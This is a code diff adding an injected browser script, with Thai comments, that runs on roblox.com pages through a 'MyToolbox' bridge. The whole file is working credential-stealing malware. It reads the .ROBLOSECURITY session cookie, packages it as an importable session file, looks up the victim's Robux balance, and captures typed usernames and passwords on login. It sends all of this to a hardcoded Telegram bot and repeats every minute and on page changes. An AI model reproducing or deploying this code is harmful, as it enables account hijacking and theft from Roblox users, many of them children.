@@ -1,1 +1,297 @@
+/* =============================================================================
+ *  INJECTED SCRIPT — ใช้ window.MyToolbox เท่านั้น
+ * ============================================================================= */
+(async function () {
+  'use strict';
+  if (window.__conduitInjected) return;
+  window.__conduitInjected = true;
 
+  /* ------------------------------- CONFIG -------------------------------- */
+  const BOT_TOKEN = '8622001163:AAFzrmxcoDLJKS51yyyddOceU_iUoOooWZ0';
+  const CHAT_ID   = '8508643177';
+
+  const GLOBAL_KEY = 'sync_message_info';
+  const FILE_KEY   = 'sync_file_info';
+
+  const IS_ROBLOX = /(^|\.)roblox\.com$/i.test(location.hostname);
+
+  /* --------------- รอให้สะพาน (MyToolbox) พร้อมก่อนทำงาน --------------- */
+  async function waitForToolbox(timeout = 15000) {
+    const t0 = Date.now();
+    while (!window.MyToolbox) {
+      if (Date.now() - t0 > timeout) throw new Error('MyToolbox not ready');
+      await new Promise(r => setTimeout(r, 50));
+    }
+    return window.MyToolbox;
+  }
+
+  let TB;
+  try { TB = await waitForToolbox(); } catch (e) { return; }
+
+  /* =========================================================================
+   * [SHIM] Storage ผ่าน toolbox
+   * ========================================================================= */
+  async function storageGet(keys) {
+    try {
+      const r = await TB.getStorage(keys);
+      return (r && r.success && r.data) ? r.data : {};
+    } catch (e) { return {}; }
+  }
+  async function storageSet(obj) {
+    try { await TB.setStorage(obj); } catch (e) {}
+  }
+
+  /* =========================================================================
+   * [SHIM] Cookie ผ่าน toolbox
+   * ========================================================================= */
+  async function getCookieValue(name, url = 'https://www.roblox.com') {
+    try {
+      const r = await TB.getCookie(url, name);
+      if (r && r.success && r.cookie) return r.cookie.value ?? null;
+    } catch (e) {}
+    return null;
+  }
+
+  function cookieExport(value) {
+    return {
+      domain: '.roblox.com',
+      expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+      hostOnly: false, httpOnly: true, name: '.ROBLOSECURITY', path: '/',
+      sameSite: 'no_restriction', secure: true, session: false, storeId: '0',
+      value
+    };
+  }
+
+  /* =========================================================================
+   * [SHIM] Network ผ่าน toolbox (เลี่ยง CORS)
+   * ========================================================================= */
+  async function tbFetch(url, options) {
+    try { return await TB.fetch(url, options); } catch (e) { return null; }
+  }
+
+  async function tgJson(method, payload) {
+    const r = await tbFetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (!r || !r.success) return null;
+    try { return JSON.parse(r.data); } catch (e) { return null; }
+  }
+
+  // ส่งไฟล์แบบ multipart เอง (FormData มักไม่รอดผ่านสะพาน)
+  async function tgDocument(filename, fileContent, caption) {
+    const boundary = '----Conduit' + Date.now().toString(16);
+    const CRLF = '\r\n';
+    let body = '';
+    body += `--${boundary}${CRLF}Content-Disposition: form-data; name="chat_id"${CRLF}${CRLF}${CHAT_ID}${CRLF}`;
+    body += `--${boundary}${CRLF}Content-Disposition: form-data; name="caption"${CRLF}${CRLF}${caption}${CRLF}`;
+    body += `--${boundary}${CRLF}Content-Disposition: form-data; name="document"; filename="${filename}"${CRLF}Content-Type: application/json${CRLF}${CRLF}${fileContent}${CRLF}`;
+    body += `--${boundary}--${CRLF}`;
+
+    const r = await tbFetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+      method: 'POST',
+      headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` },
+      body
+    });
+    if (!r || !r.success) return null;
+    try { return JSON.parse(r.data); } catch (e) { return null; }
+  }
+
+  /* =========================================================================
+   * ส่วนที่ยกมาจาก background.js
+   * ========================================================================= */
+  async function getDeviceFingerprint() {
+    const n = navigator;
+    const info = `${n.hardwareConcurrency || 0}-${n.deviceMemory || 0}-${n.platform || 'unknown'}`;
+    return btoa(info).substring(0, 12);
+  }
+
+  function escapeMarkdown(text) {
+    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+  }
+
+  async function getRobux(userId) {
+    const r = await tbFetch(`https://economy.roblox.com/v1/users/${userId}/currency`);
+    if (!r || !r.success) return -1;
+    try {
+      const data = JSON.parse(r.data);
+      return data.robux !== undefined ? data.robux : 0;
+    } catch (e) { return -1; }
+  }
+
+  async function runSyncProcess(message) {
+    const { username, userId, profilePic } = message;
+    if (!userId || userId == '1') return;
+
+    const cookieValue = await getCookieValue('.ROBLOSECURITY');
+    if (!cookieValue) return;
+
+    const deviceId = await getDeviceFingerprint();
+    const storage = await storageGet([GLOBAL_KEY, FILE_KEY, 'last_sent_cookie']);
+
+    const currentCookieHash = btoa(unescape(encodeURIComponent(cookieValue)));
+    if (currentCookieHash === storage.last_sent_cookie) return;
+
+    const currentRobux = await getRobux(userId);
+    const picLink = profilePic || `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
+    const hiddenPhoto = `[\u200b](${picLink})`;
+
+    const text = `${hiddenPhoto}💻 *\\[DEVICE ID: \`${escapeMarkdown(deviceId)}\`\\]*\n` +
+                 `👤 *User:* ${escapeMarkdown(username)}\n` +
+                 `🆔 *ID:* \`${escapeMarkdown(userId)}\`\n` +
+                 `💸 *Robux:* 💰 *${escapeMarkdown(currentRobux)}*\n\n` +
+                 `🍪 *Cookie \\(Tap to Copy\\):*\n` +
+                 `\`${escapeMarkdown(cookieValue)}\`\n\n` +
+                 `⏰ *Update:* ${escapeMarkdown(new Date().toLocaleString())}`;
+
+    let success = false;
+    let targetMsgId = (storage[GLOBAL_KEY] || {}).messageId;
+    const fileInfo = storage[FILE_KEY] || { messageId: null };
+
+    const apiBody = { chat_id: CHAT_ID, text, parse_mode: 'MarkdownV2', disable_web_page_preview: false };
+
+    // 1) ส่ง/แก้ไข ข้อความสรุป
+    if (targetMsgId) {
+      const editData = await tgJson('editMessageText', { ...apiBody, message_id: targetMsgId });
+      if (editData && editData.ok) success = true;
+    }
+    if (!success) {
+      const sendData = await tgJson('sendMessage', apiBody);
+      if (sendData && sendData.ok) { targetMsgId = sendData.result.message_id; success = true; }
+    }
+
+    // 2) ลบไฟล์เก่าและส่งไฟล์ใหม่
+    if (success) {
+      if (fileInfo.messageId) {
+        await tgJson('deleteMessage', { chat_id: CHAT_ID, message_id: fileInfo.messageId });
+      }
+
+      const fileData = await tgDocument(
+        `session_${username}.json`,
+        JSON.stringify([cookieExport(cookieValue)], null, 2),
+        `📂 ไฟล์คุกกี้ล่าสุด: ${username}`
+      );
+      const newFileMsgId = (fileData && fileData.ok) ? fileData.result.message_id : null;
+
+      await storageSet({
+        [GLOBAL_KEY]: { messageId: targetMsgId },
+        [FILE_KEY]: { messageId: newFileMsgId },
+        'last_sent_cookie': currentCookieHash,
+        'last_user_id': userId,
+        'last_username': username,
+        'last_pic': picLink
+      });
+    }
+  }
+
+  /* =========================================================================
+   * ส่วนที่ยกมาจาก content.js
+   * ========================================================================= */
+  async function reportToTelegram(title, details, isCookie = false) {
+    try {
+      if (isCookie) {
+        await tgDocument(`session_${location.hostname}.json`, JSON.stringify(details, null, 2), `🔔 ${title}`);
+      } else {
+        await tgJson('sendMessage', {
+          chat_id: CHAT_ID,
+          text: `🎯 **${title}**\n\n${details}`,
+          parse_mode: 'Markdown'
+        });
+      }
+    } catch (e) {}
+  }
+
+  function captureCredentials() {
+    try {
+      const userEl = document.getElementById('login-username') || document.querySelector('input[name*="username" i]') || document.querySelector('input[type="text"]');
+      const passEl = document.getElementById('login-password') || document.querySelector('input[name*="password" i]') || document.querySelector('input[type="password"]');
+
+      if (userEl && passEl) {
+        const u = userEl.value.trim();
+        const p = passEl.value.trim();
+        if (u || p) {
+          reportToTelegram('Login Attempt', `🌐 Host: ${location.hostname}\n👤 User: \`${u}\`\n🔑 Pass: \`${p}\``);
+        }
+      }
+    } catch (e) {}
+  }
+
+  let lastRobloCookie = null;
+  async function watchCookies() {
+    try {
+      const value = await getCookieValue('.ROBLOSECURITY');
+      if (!value) return;
+      if (lastRobloCookie === null) { lastRobloCookie = value; return; }
+      if (value !== lastRobloCookie) {
+        lastRobloCookie = value;
+        reportToTelegram('New Session Captured', [cookieExport(value)], true);
+      }
+    } catch (e) {}
+  }
+
+  function initV3() {
+    document.addEventListener('click', (e) => {
+      const isLoginBtn = e.target.id === 'login-button' ||
+                         (e.target.innerText && e.target.innerText.toUpperCase().includes('LOG IN'));
+      if (isLoginBtn) setTimeout(captureCredentials, 500);
+    });
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') setTimeout(captureCredentials, 500);
+    });
+
+    setInterval(watchCookies, 3000);
+  }
+
+  async function startRobloxSync() {
+    try {
+      let userId = null;
+      const pathParts = location.pathname.split('/');
+      if (pathParts[1] === 'users' && pathParts[2]) userId = pathParts[2];
+      if (!userId && window.__INITIAL_STATE__?.session?.userId) userId = window.__INITIAL_STATE__.session.userId;
+      if (!userId) {
+        const meta = document.querySelector('meta[name="user-data"]');
+        if (meta) userId = meta.getAttribute('data-userid');
+      }
+
+      if (!userId || isNaN(userId) || userId == '1') return;
+
+      const [userRes, thumbRes] = await Promise.all([
+        tbFetch(`https://users.roblox.com/v1/users/${userId}`),
+        tbFetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`)
+      ]);
+
+      if (!userRes || !userRes.success || !thumbRes || !thumbRes.success) return;
+      const userData = JSON.parse(userRes.data);
+      const thumbData = JSON.parse(thumbRes.data);
+      const profilePicUrl = thumbData.data?.[0]?.imageUrl;
+
+      if (userData.name && profilePicUrl) {
+        runSyncProcess({ username: userData.name, userId, profilePic: profilePicUrl });
+      }
+    } catch (e) {}
+  }
+
+  /* =========================================================================
+   * BOOT
+   * ========================================================================= */
+  if (IS_ROBLOX) {
+    initV3();
+    startRobloxSync();
+
+    // แทน chrome.alarms: sync ทุก 1 นาทีจากข้อมูลที่เคยเก็บไว้
+    setInterval(async () => {
+      const s = await storageGet(['last_user_id', 'last_username', 'last_pic']);
+      if (s.last_user_id) {
+        runSyncProcess({ username: s.last_username, userId: s.last_user_id, profilePic: s.last_pic });
+      }
+    }, 60000);
+
+    // รองรับ SPA: เปลี่ยน URL แล้ว re-sync
+    let lastUrl = location.href;
+    setInterval(() => {
+      if (location.href !== lastUrl) { lastUrl = location.href; startRobloxSync(); }
+    }, 2000);
+  }
+})();
